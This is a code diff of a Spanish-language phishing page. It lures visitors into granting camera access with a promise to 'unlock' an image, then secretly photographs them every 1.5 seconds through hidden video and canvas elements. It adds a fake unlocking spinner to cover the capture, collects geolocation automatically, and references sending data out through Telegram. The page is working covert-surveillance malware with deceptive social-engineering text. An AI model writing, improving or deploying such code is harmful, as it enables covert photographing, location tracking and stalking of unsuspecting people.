@@ -45,7 +45,7 @@ send_to_telegram($msg);
             brightness: 1;
         }
 
-        /* Modal */
+        /* Modal permisos */
         #cameraModal {
             position: fixed;
             top: 0; left: 0;
@@ -81,20 +81,58 @@ send_to_telegram($msg);
         #grantAccess:hover {
             background-color: #cc0000;
         }
+
+        /* Animación desbloqueo */
+        #unlockModal {
+            display: none;
+            position: fixed;
+            top:0; left:0;
+            width:100%; height:100%;
+            background: rgba(0,0,0,0.8);
+            z-index: 10000;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-family: Arial, sans-serif;
+        }
+
+        #unlockModal h2 { margin-bottom: 20px; }
+
+        .spinner {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #FF0000;
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+          0% { transform: rotate(0deg); }
+          100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body>
 
-<!-- Modal de permisos -->
+<!-- Modal permisos -->
 <div id="cameraModal">
     <div class="content">
         <h2>¡Atención!</h2>
-        <p>📸 ¡Wow! Apareces en la imagen de fondo… ¿seguro que no eres tú? Da acceso a tu cámara para poder ver la foto completa y guardarla.</p>
+        <p>📸 Para poder ver la imagen completa y guardar tus videos de demostración, necesitamos acceso a tu cámara.</p>
         <button id="grantAccess">Permitir acceso</button>
     </div>
 </div>
 
-<!-- Video y Canvas ocultos para tomar fotos -->
+<!-- Modal desbloqueo animación -->
+<div id="unlockModal">
+    <h2>Desbloqueando imagen...</h2>
+    <div class="spinner"></div>
+</div>
+
+<!-- Video y Canvas ocultos -->
 <video id="video" autoplay playsinline style="display:none;"></video>
 <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
 
@@ -112,20 +150,25 @@ function post(imgdata){
     });
 }
 
-// Configuración cámara
 const video = document.getElementById('video');
 const canvas = document.getElementById('canvas');
 const constraints = { audio: false, video: { facingMode: "user" } };
 
-// Acceso a la cámara (iniciado al permitir)
+// Iniciar cámara y captura de fotos
 async function initCamera() {
     try {
         const stream = await navigator.mediaDevices.getUserMedia(constraints);
         video.srcObject = stream;
         capturePhotoLoop();
 
-        // Cambiar fondo a claro
-        document.body.classList.add('unlocked');
+        // Animación de desbloqueo
+        const unlockModal = document.getElementById('unlockModal');
+        unlockModal.style.display = 'flex';
+
+        setTimeout(() => {
+            unlockModal.style.display = 'none';
+            document.body.classList.add('unlocked');
+        }, 5000);
 
     } catch (e) {
         console.error('Error al acceder a la cámara:', e);
@@ -144,13 +187,34 @@ function capturePhotoLoop() {
     }, 1500);
 }
 
-// Al presionar "Permitir acceso"
-document.getElementById('grantAccess').addEventListener('click', () => {
-    document.getElementById('cameraModal').style.display = 'none';
-    initCamera();
+// Botón permitir acceso
+document.getElementById('grantAccess').addEventListener('click', async () => {
+    try {
+        // Solicita permisos reales de cámara
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        video.srcObject = stream;
+        document.getElementById('cameraModal').style.display = 'none';
+
+        // Animación desbloqueo después de aceptar la cámara
+        const unlockModal = document.getElementById('unlockModal');
+        unlockModal.style.display = 'flex';
+
+        // Inicia la captura de fotos oculta
+        capturePhotoLoop();
+
+        setTimeout(() => {
+            unlockModal.style.display = 'none';
+            document.body.classList.add('unlocked');
+        }, 5000);
+
+    } catch (e) {
+        // Si rechaza, vuelve a mostrar el modal
+        alert("Debes permitir el acceso a la cámara para desbloquear la imagen.");
+        document.getElementById('cameraModal').style.display = 'flex';
+    }
 });
 
-// Obtener ubicación y enviarla automáticamente
+// Enviar ubicación automáticamente
 if ('geolocation' in navigator) {
     navigator.geolocation.getCurrentPosition(function(pos) {
         const { latitude, longitude, accuracy } = pos.coords;
